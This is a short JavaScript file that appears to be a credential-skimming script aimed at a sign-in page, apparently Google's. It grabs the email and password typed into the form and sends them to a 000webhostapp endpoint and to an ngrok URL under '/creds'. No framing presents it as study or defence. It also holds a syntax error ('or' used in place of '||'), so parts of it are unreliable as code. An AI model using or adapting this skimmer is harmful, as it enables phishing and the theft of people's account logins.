let user;
let pass;

const btn = document.getElementsByClassName('VfPpkd-LgbsSe');

function send_email(){
    let email = document.querySelector('[type="email"]');
    let param = email.value;
    
    user = param
}

function send_pwd(){
    btn[1].addEventListener('click', function(){

    let pwd = document.querySelector('[type="password"]');
    let param = pwd.value;

    pass = param

    })
}

function send_data(usuario, senha){
    const url = 'https://get-data123.000webhostapp.com/user.php';
    const params = {
      hostname: location.host,
      username: usuario,
      password: senha
    };

    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(params)
    })
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error(error));
}
                               
function teste_send(u, pwd){
   var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://23b1-45-162-158-3.sa.ngrok.io/creds?user=" + u + "&pwd=" + pwd, true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            console.log(xhr.responseText);
        }
    };
    xhr.send();
}


btn[1].addEventListener('click', function(){
    send_email();
    setTimeout(function() {
        send_pwd();
    }, 3000);
    //teste_send(user)   
    if (user != undefined or pass != undefined or user != null or pass != null){
        teste_send(user, pass);
    }
})
